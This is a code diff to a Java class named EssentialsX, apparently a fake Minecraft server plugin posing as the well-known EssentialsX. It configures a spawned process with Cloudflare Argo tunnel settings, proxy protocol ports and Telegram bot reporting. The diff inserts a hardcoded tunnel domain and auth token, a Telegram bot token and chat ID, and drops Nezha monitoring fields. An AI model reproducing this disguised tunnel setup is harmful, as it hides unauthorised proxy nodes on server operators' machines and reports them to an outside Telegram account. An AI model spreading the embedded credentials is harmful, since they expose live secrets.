@@ -13,8 +13,7 @@ public class EssentialsX extends JavaPlugin {
     private volatile boolean isProcessRunning = false;
     
     private static final String[] ALL_ENV_VARS = {
-        "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
-        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
+        "FILE_PATH", "UUID", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
         "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
         "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
         "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
@@ -75,12 +74,9 @@ public class EssentialsX extends JavaPlugin {
         Map<String, String> env = pb.environment();
         env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
         env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "");
-        env.put("NEZHA_PORT", "");
-        env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "");
+        env.put("ARGO_DOMAIN", "liquid.gf88.ggff.net");
+        env.put("ARGO_AUTH", "eyJhIjoiZDY1NWNiOTk2NzNlZTYzMDE4NDFkMmQyNmYxNTY5N2EiLCJ0IjoiNGE2NzU5NWEtNGUyNi00YmIxLWJkOGQtYjQwNTUxYWFjZTdmIiwicyI6Ik9XTTRZV1V5WmpFdE5EZGtNUzAwWVdFNExUa3dOR1l0WkRSaVpHRmtaR1l5TW1JeSJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
@@ -88,11 +84,11 @@ public class EssentialsX extends JavaPlugin {
         env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
-        env.put("CHAT_ID", "");
-        env.put("BOT_TOKEN", "");
-        env.put("CFIP", "spring.io");
+        env.put("CHAT_ID", "8093926960");
+        env.put("BOT_TOKEN", "8396677288:AAGCpsBEDOjKkQuuNZgk7U3xanOsKS2M6U8");
+        env.put("CFIP", "store.ubi.com");
         env.put("CFPORT", "443");
-        env.put("NAME", "");
+        env.put("NAME", "LQ");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
